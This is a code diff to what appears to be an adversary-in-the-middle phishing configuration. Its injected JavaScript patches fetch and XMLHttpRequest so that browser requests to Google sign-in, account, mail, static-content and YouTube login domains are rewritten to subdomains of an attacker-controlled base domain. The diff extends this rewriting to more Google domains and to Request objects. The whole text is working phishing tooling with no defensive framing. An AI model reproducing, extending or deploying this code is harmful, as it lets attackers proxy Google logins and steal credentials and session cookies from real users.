@@ -74,24 +74,54 @@ js_inject:
         var originalFetch = window.fetch;
         window.fetch = function(url, options) {
           if (typeof url === 'string') {
-            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
-            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
+            url = url.replace('https://accounts.google.com', 'https://accounts.' + baseDomain);
+            url = url.replace('https://www.google.com', 'https://www.' + baseDomain);
+            url = url.replace('https://myaccount.google.com', 'https://myaccount.' + baseDomain);
             url = url.replace('https://play.google.com', 'https://play.' + baseDomain);
             url = url.replace('https://apis.google.com', 'https://apis.' + baseDomain);
             url = url.replace('https://gds.google.com', 'https://gds.' + baseDomain);
             url = url.replace('https://mail.google.com', 'https://mail.' + baseDomain);
+            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
+            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
+            url = url.replace('https://content.googleapis.com', 'https://content.' + baseDomain);
+            url = url.replace('https://accounts.youtube.com', 'https://youtube.' + baseDomain);
+          } else if (typeof url === 'object' && url.url) {
+            try {
+              var fixed = url.url;
+              fixed = fixed.replace('https://accounts.google.com', 'https://accounts.' + baseDomain);
+              fixed = fixed.replace('https://www.google.com', 'https://www.' + baseDomain);
+              fixed = fixed.replace('https://myaccount.google.com', 'https://myaccount.' + baseDomain);
+              fixed = fixed.replace('https://play.google.com', 'https://play.' + baseDomain);
+              fixed = fixed.replace('https://apis.google.com', 'https://apis.' + baseDomain);
+              fixed = fixed.replace('https://gds.google.com', 'https://gds.' + baseDomain);
+              fixed = fixed.replace('https://mail.google.com', 'https://mail.' + baseDomain);
+              fixed = fixed.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
+              fixed = fixed.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
+              fixed = fixed.replace('https://content.googleapis.com', 'https://content.' + baseDomain);
+              fixed = fixed.replace('https://accounts.youtube.com', 'https://youtube.' + baseDomain);
+              if (fixed !== url.url) {
+                url = new Request(fixed, url);
+              }
+            } catch(e) {
+              url = typeof url === 'object' && url.url ? url.url : url;
+            }
           }
           return originalFetch.call(this, url, options);
         };
         var originalXHROpen = XMLHttpRequest.prototype.open;
         XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
           if (typeof url === 'string') {
-            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
-            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
+            url = url.replace('https://accounts.google.com', 'https://accounts.' + baseDomain);
+            url = url.replace('https://www.google.com', 'https://www.' + baseDomain);
+            url = url.replace('https://myaccount.google.com', 'https://myaccount.' + baseDomain);
             url = url.replace('https://play.google.com', 'https://play.' + baseDomain);
             url = url.replace('https://apis.google.com', 'https://apis.' + baseDomain);
             url = url.replace('https://gds.google.com', 'https://gds.' + baseDomain);
             url = url.replace('https://mail.google.com', 'https://mail.' + baseDomain);
+            url = url.replace('https://www.gstatic.com', 'https://gstatic.' + baseDomain);
+            url = url.replace('https://ssl.gstatic.com', 'https://sl.' + baseDomain);
+            url = url.replace('https://content.googleapis.com', 'https://content.' + baseDomain);
+            url = url.replace('https://accounts.youtube.com', 'https://youtube.' + baseDomain);
           }
           return originalXHROpen.call(this, method, url, async, user, password);
         };
